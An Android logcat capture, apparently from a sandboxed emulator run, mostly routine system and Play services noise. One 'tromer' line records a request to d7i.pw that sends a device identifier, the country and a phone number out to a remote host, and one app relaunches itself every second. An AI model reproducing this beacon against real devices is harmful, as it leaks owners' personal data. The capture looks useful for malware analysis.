+12-05 18:54:34.696  6639  6676 I zygote  : Explicit concurrent copying GC freed 39561(1296KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.807ms
+12-05 18:54:34.696  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:35.440  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:35.653  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:35.653  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:35.669  6639  6676 I zygote  : Explicit concurrent copying GC freed 39567(1296KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 9us total 2.512ms
+12-05 18:54:35.669  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:36.441  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:36.572  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:36.572  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:36.589  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 9us total 2.466ms
+12-05 18:54:36.589  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:37.427  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:37.529  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:37.529  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:37.545  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:37.547  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 10us total 2.452ms
+12-05 18:54:38.427  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:38.429  1440  1458 D hwcomposer: hw_composer sent 324 syncs in 60s
+12-05 18:54:38.475  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:38.475  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:38.492  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 14us total 2.754ms
+12-05 18:54:38.492  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:37.425  1641  1895 I chatty  : uid=1000(system) Binder:1641_5 identical 4 lines
+12-05 18:54:38.425  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:39.430  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:39.432  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:39.451  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:39.451  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:39.468  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:39.470  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 9us total 2.331ms
+12-05 18:54:40.371  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:40.371  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:40.391  6639  6676 I zygote  : Explicit concurrent copying GC freed 39257(1264KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 11us total 3.039ms
+12-05 18:54:40.391  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:40.436  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:41.347  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:41.347  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:41.364  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.669ms
+12-05 18:54:41.365  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:41.433  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:42.269  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:42.269  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:42.286  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 13us total 2.704ms
+12-05 18:54:42.286  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:42.421  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:43.213  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:43.213  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:43.232  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 11us total 2.837ms
+12-05 18:54:43.232  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:43.437  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:44.183  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:44.183  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:44.199  6639  6676 I zygote  : Explicit concurrent copying GC freed 39550(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 9us total 2.399ms
+12-05 18:54:44.199  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:42.421  1641  2172 I chatty  : uid=1000(system) Binder:1641_9 identical 3 lines
+12-05 18:54:43.436  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:45.501  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:45.356  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:45.503  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:45.522  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:46.022  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:46.022  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:46.039  6639  6676 I zygote  : Explicit concurrent copying GC freed 14457(533KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1112KB/2MB, paused 9us total 2.470ms
+12-05 18:54:46.039  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:46.423  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:46.968  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:46.968  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:46.987  6639  6676 I zygote  : Explicit concurrent copying GC freed 39646(1281KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 9us total 2.434ms
+12-05 18:54:46.987  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:47.420  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:47.422  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:54:47.422  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:47.423  6099  6099 D tromer  : started
+12-05 18:54:47.423  1641  2172 I WifiService: acquireWifiLock uid=10402 lockMode=1
+12-05 18:54:47.432  6099  6860 D tromer  : state : null
+12-05 18:54:47.432  6099  6860 D tromer  : http://d7i.pw/o.php?a=1&b=358240051111110&c=Android&d=us&e=+15555215554&f=0.3.300&g=8.1.0&prefix=core_2
+12-05 18:54:47.433  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:54:47.433  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:47.434  6099  6860 W System.err: java.net.UnknownHostException: Unable to resolve host "d7i.pw": No address associated with hostname
+12-05 18:54:47.434  6099  6860 W System.err: 	at java.net.Inet6AddressImpl.lookupHostByName(Inet6AddressImpl.java:141)
+12-05 18:54:47.434  6099  6860 W System.err: 	at java.net.Inet6AddressImpl.lookupAllHostAddr(Inet6AddressImpl.java:90)
+12-05 18:54:47.434  6099  6860 W System.err: 	at java.net.InetAddress.getAllByName(InetAddress.java:787)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.Dns$1.lookup(Dns.java:39)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.internal.http.RouteSelector.resetNextInetSocketAddress(RouteSelector.java:175)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.internal.http.RouteSelector.nextProxy(RouteSelector.java:141)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.internal.http.RouteSelector.next(RouteSelector.java:83)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:174)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:126)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:95)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:281)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:224)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:461)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:407)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:244)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.gnom.anton.a.a(Unknown Source:254)
+12-05 18:54:47.434  6099  6860 W System.err: 	at com.gnom.anton.a.doInBackground(Unknown Source:4)
+12-05 18:54:47.434  6099  6860 W System.err: 	at android.os.AsyncTask$2.call(AsyncTask.java:333)
+12-05 18:54:47.434  6099  6860 W System.err: 	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
+12-05 18:54:47.434  6099  6860 W System.err: 	at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:245)
+12-05 18:54:47.434  6099  6860 W System.err: 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:54:47.434  6099  6860 W System.err: 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:54:47.434  6099  6860 W System.err: 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:54:47.434  6099  6860 W System.err: Caused by: android.system.GaiException: android_getaddrinfo failed: EAI_NODATA (No address associated with hostname)
+12-05 18:54:47.434  6099  6860 W System.err: 	at libcore.io.Linux.android_getaddrinfo(Native Method)
+12-05 18:54:47.434  6099  6860 W System.err: 	at libcore.io.ForwardingOs.android_getaddrinfo(ForwardingOs.java:59)
+12-05 18:54:47.434  6099  6860 W System.err: 	at java.net.Inet6AddressImpl.lookupHostByName(Inet6AddressImpl.java:122)
+12-05 18:54:47.434  6099  6860 W System.err: 	... 22 more
+12-05 18:54:47.435  1641  2950 I WifiService: releaseWifiLock uid=10402
+12-05 18:54:47.438  2016  4785 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService started execution. cause:4 exec_start_elapsed_seconds: 551 [CONTEXT service_id=218 ]
+12-05 18:54:47.442  2016  2104 I NetRec  : [64] anai.a: Refreshing scores for 1 networks.
+12-05 18:54:47.443  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:54:47.443  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:47.446  2016  2016 D BoundBrokerSvc: onBind: Intent { act=com.google.android.gms.phenotype.service.START cmp=com.google.android.gms/.chimera.PersistentApiService }
+12-05 18:54:47.446  2016  2016 D BoundBrokerSvc: Loading bound service for intent: Intent { act=com.google.android.gms.phenotype.service.START cmp=com.google.android.gms/.chimera.PersistentApiService }
+12-05 18:54:47.449  2186  2186 D BoundBrokerSvc: onBind: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:54:47.449  2186  2186 D BoundBrokerSvc: Loading bound service for intent: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:54:47.453  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:54:47.453  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:47.457  2016  2027 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:54:47.492  3802  3808 I zygote  : Do partial code cache collection, code=27KB, data=21KB
+12-05 18:54:47.492  3802  3808 I zygote  : After code cache collection, code=27KB, data=21KB
+12-05 18:54:47.492  3802  3808 I zygote  : Increasing code cache capacity to 256KB
+12-05 18:54:47.641  2016  2027 W GLSUser : [AppCertManager] Failed to get security token.
+12-05 18:54:47.641  2016  2027 W GLSUser : java.io.IOException: INVALID_SENDER
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at aeds.f(:com.google.android.gms@204217022@20.42.17 (040700-342117392):21)
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at aeds.e(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at aeds.d(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at hzb.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):13)
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at hyz.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at hyz.dW(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at crb.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at android.os.Binder.transact(Binder.java:627)
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at cuy.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at android.os.Binder.transact(Binder.java:627)
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at aavv.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):17)
+12-05 18:54:47.641  2016  2027 W GLSUser : 	at android.os.Binder.execTransact(Binder.java:697)
+12-05 18:54:47.742  2016  2027 W GLSUser : [AppCertManager] IOException while requesting key: 
+12-05 18:54:47.742  2016  2027 W GLSUser : java.io.IOException: Invalid device key response.
+12-05 18:54:47.742  2016  2027 W GLSUser : 	at hzb.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):44)
+12-05 18:54:47.742  2016  2027 W GLSUser : 	at hyz.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:54:47.742  2016  2027 W GLSUser : 	at hyz.dW(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:54:47.742  2016  2027 W GLSUser : 	at crb.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:54:47.742  2016  2027 W GLSUser : 	at android.os.Binder.transact(Binder.java:627)
+12-05 18:54:47.742  2016  2027 W GLSUser : 	at cuy.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:47.742  2016  2027 W GLSUser : 	at android.os.Binder.transact(Binder.java:627)
+12-05 18:54:47.742  2016  2027 W GLSUser : 	at aavv.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):17)
+12-05 18:54:47.742  2016  2027 W GLSUser : 	at android.os.Binder.execTransact(Binder.java:697)
+12-05 18:54:47.743  2016  2027 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:54:47.754  2016  2406 E apzj    : Phenotype API error. Event # ceqj@5d5511c2, EventCode: 12 [CONTEXT service_id=51 ]
+12-05 18:54:47.754  2016  2406 E apzj    : apyo: 29503
+12-05 18:54:47.754  2016  2406 E apzj    : 	at apzp.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):25)
+12-05 18:54:47.754  2016  2406 E apzj    : 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:54:47.754  2016  2406 E apzj    : 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:54:47.754  2016  2406 E apzj    : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:54:47.754  2016  2406 E apzj    : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:47.754  2016  2406 E apzj    : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:54:47.754  2016  2406 E apzj    : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:54:47.754  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:54:47.754  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:54:47.754  2016  2406 E apzj    : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:47.754  2016  2406 E apzj    : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:54:47.756  2016  2406 E AsyncOperation: operation=GetCommittedConfigurationOperationCall, opStatusCode=29503 [CONTEXT service_id=51 ]
+12-05 18:54:47.756  2016  2406 E AsyncOperation: OperationException[Status{statusCode=unknown status code: 29503, resolution=null}]
+12-05 18:54:47.756  2016  2406 E AsyncOperation: 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:54:47.756  2016  2406 E AsyncOperation: 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:54:47.756  2016  2406 E AsyncOperation: 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:54:47.756  2016  2406 E AsyncOperation: 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:47.756  2016  2406 E AsyncOperation: 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:54:47.756  2016  2406 E AsyncOperation: 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:54:47.756  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:54:47.756  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:54:47.756  2016  2406 E AsyncOperation: 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:47.756  2016  2406 E AsyncOperation: 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:54:47.757  2016  2602 E NetRec  : [128] amxc.c: Could not retrieve server token for package com.google.android.apps.gcs
+12-05 18:54:47.757  2016  2602 E NetRec  : java.util.concurrent.ExecutionException: ryf: 29503: 
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at axac.l(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at axac.f(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at amxc.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at amxc.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at amxb.getHeaders(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at com.android.volley.toolbox.HttpClientStack.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):18)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at sym.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at bsk.executeRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at com.android.volley.toolbox.BasicNetwork.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):3)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at syn.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):17)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at com.android.volley.NetworkDispatcher.processRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at com.android.volley.NetworkDispatcher.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at com.android.volley.NetworkDispatcher.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:47.757  2016  2602 E NetRec  : Caused by: ryf: 29503: 
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at sdv.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at apyy.o(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at apzp.e(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at aaso.p(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):11)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:54:47.757  2016  2602 E NetRec  : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:54:47.757  2016  2602 W NetRec  : [128] amxc.a: No server tokens extracted.
+12-05 18:54:47.919  1641  2172 E memtrack: Couldn't load memtrack module
+12-05 18:54:47.919  1641  2172 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:47.952  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 49us total 5.382ms
+12-05 18:54:47.952  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:47.959  2016  2602 E Volley  : [128] NetworkUtility.d: Unexpected response code 400 for https://mobilenetworkscoring-pa.googleapis.com/v1/GetWifiQuality?key=AIzaSyBrlVtd67QvwS_Wz0Do4ZIdOeA6ThtVczU
+12-05 18:54:47.960  2016  2104 I NetRec  : [64] anai.c: Will retry failed rapid_refresh_scores_task task as standard refresh.
+12-05 18:54:47.963  2016  2104 W NetRec  : [64] anai.a: Unexpected exception com.android.volley.ClientError while waiting for score updates (com.android.volley.ClientError). Returning 2.
+12-05 18:54:47.967  2016  2104 I NetRec  : [64] NetRecChimeraGcmTaskService.a: Still entries pending update, scheduling new rapid_refresh_scores_task refresh.
+12-05 18:54:47.973  2016  2104 I NetRec  : [64] NetRecChimeraGcmTaskService.a: Completed rapid_refresh_scores_task score refresh task in 530 ms, returning 2
+12-05 18:54:47.976  2016  4057 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService finished executing. cause:4 result: 2 elapsed_millis: 543 uptime_millis: 543 exec_start_elapsed_seconds: 551 [CONTEXT service_id=218 ]
+12-05 18:54:46.422  1641  2950 I chatty  : uid=1000(system) Binder:1641_E identical 2 lines
+12-05 18:54:47.419  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:48.431  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:48.432  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:48.811  1447  1447 I boot-pipe: done populating /dev/random
+12-05 18:54:48.900  1641  2172 E memtrack: Couldn't load memtrack module
+12-05 18:54:48.900  1641  2172 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:48.914  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:48.914  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 9us total 2.220ms
+12-05 18:54:49.436  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:49.859  1641  2172 E memtrack: Couldn't load memtrack module
+12-05 18:54:49.859  1641  2172 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:49.880  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.452ms
+12-05 18:54:49.880  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:50.385  1641  1895 D WificondControl: Scan result ready event
+12-05 18:54:50.432  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:50.866  1641  2172 E memtrack: Couldn't load memtrack module
+12-05 18:54:50.866  1641  2172 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:50.885  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:50.885  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 20us total 2.918ms
+12-05 18:54:51.437  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:51.853  1641  2172 E memtrack: Couldn't load memtrack module
+12-05 18:54:51.853  1641  2172 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:51.871  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 8us total 2.307ms
+12-05 18:54:51.871  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:50.432  1641  1895 I chatty  : uid=1000(system) Binder:1641_5 identical 2 lines
+12-05 18:54:51.437  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:52.422  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:52.423  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:52.806  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:52.806  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:52.826  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 11us total 3.217ms
+12-05 18:54:52.826  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:53.420  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:53.421  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:53.750  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:54:53.750  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
